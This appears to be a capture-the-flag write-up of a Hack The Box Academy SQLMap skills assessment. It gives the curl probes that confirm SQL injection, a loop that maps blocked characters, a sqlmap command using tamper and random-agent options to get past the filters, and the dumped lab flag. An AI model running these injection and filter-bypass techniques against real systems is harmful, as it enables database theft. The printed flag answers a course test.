# Section 11 — Skills Assessment

**Scenario:** Minishop web application with basic protections. Find SQLi, retrieve `final_flag` table contents.

---

## Reconnaissance

Static-looking pages: `index.html`, `shop.html`, `product-single.html`, `cart.html`. No obvious dynamic links.

The injection point is hidden in JavaScript on `shop.html` — the "Add to Cart" button POSTs JSON to a backend endpoint:

```bash
curl -sk "http://TARGET/shop.html" | grep -B2 -A8 'action.php'
```

```javascript
let url = "action.php"; 
xhr.open("POST", url, true); 
xhr.setRequestHeader("Content-Type", "application/json"); 
var data = JSON.stringify({ "id": 1 }); 
xhr.send(data); 
```

> **Lesson:** Always check JS for backend endpoints — modern apps hide AJAX calls that don't appear in `href`/`form` attributes.

---

## Confirming Injection Manually

```bash
curl -sk -X POST "http://TARGET/action.php" \
  -H "Content-Type: application/json" \
  -d "{\"id\":\"1'\"}"

# → SQLSTATE[42000]: Syntax error ... near '', 476, 1, 777, 0)' at line 1
```

Verbose SQL error confirms:
- Error-based injection viable
- Underlying query is an INSERT (multiple comma-separated values)
- MariaDB backend

---

## Filter Detection

Probe each suspicious character to map the blocklist:

```bash
for chr in '=' '>' '<' ' ' "'" '"' '#' '*'; do
  resp=$(curl -sk -X POST "http://TARGET/action.php" \
    -H "Content-Type: application/json" \
    -d "{\"id\":\"1${chr}\"}")
  [ -z "$resp" ] && echo "BLOCKED: '$chr'" || echo "passed: '$chr'"
done
```

Result: `<`, `>`, and **space** are filtered. Same pattern as Case 11.

Tampers needed:
- `between` → rewrites `>` and `=` (handles `<`/`>` filter)
- Space handling is automatic in `between`'s sibling payloads, OR add `space2comment` to be safe

---

## Exploitation

```bash
sqlmap -u "http://154.57.164.78:31836/action.php" \
  --data='{"id":1}' \
  --tamper=between --random-agent \
  --batch --flush-session \
  --dump -T final_flag -D production
```

| Flag | Why |
|------|-----|
| `--data='{"id":1}'` | JSON POST body — sqlmap auto-detects JSON format |
| `--tamper=between` | Bypass `>` and `=` filters |
| `--random-agent` | Bypass UA blocklist; sqlmap's default UA is blocked |
| `--flush-session` | Discard cached "not injectable" state from failed prior attempts |
| `--batch` | No interactive prompts |
| `-T final_flag -D production` | Target table and database directly |

### Result

```
Database: production
Table: final_flag
[1 entry]
+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```

**Final Flag:** `HTB{n07_50_h4rd_r16h7?!}`

---

## Full Attack Chain Summary

```
1. Recon shop.html → find action.php JS POST endpoint
2. Manual probe with '  → confirm SQL error (error-based viable)
3. Char filter probe → find blocked: <, >, space
4. Map filter to tamper → between
5. sqlmap --tamper=between --random-agent → dump production.final_flag
```

---

## Exam Notes

- The "basic protection" was a character filter (`<`, `>`, space) + UA blocklist — both single-flag fixes (`--tamper=between` + `--random-agent`)
- JSON-bodied endpoints are common in modern apps — sqlmap handles them natively, just pass the JSON in `--data`
- When sqlmap reports "not injectable" but manual probing shows clear errors → almost always a tamper/UA issue. Don't bump `--level` first; check filters and UA
- `--flush-session` is essential after failed runs — sqlmap caches negative detection and won't retry without it
- The error message leaking the SQL fragment (`'', 476, 1, 777, 0)`) revealed the INSERT structure, but you don't need to reconstruct the full query — sqlmap handles boundary detection automatically once the tamper unblocks payloads

## Sources

- [aldern00b — HTB SQLMap Essentials Skills Assessment](https://www.aldern00b.com/post/htb-sqlmap-essentials-skills-assessment)
- [HTB Forum — SQLMap Essentials Skill Assessment issues](https://forum.hackthebox.com/t/htb-academy-sqlmap-essentials-skill-assessment-issues/4313)
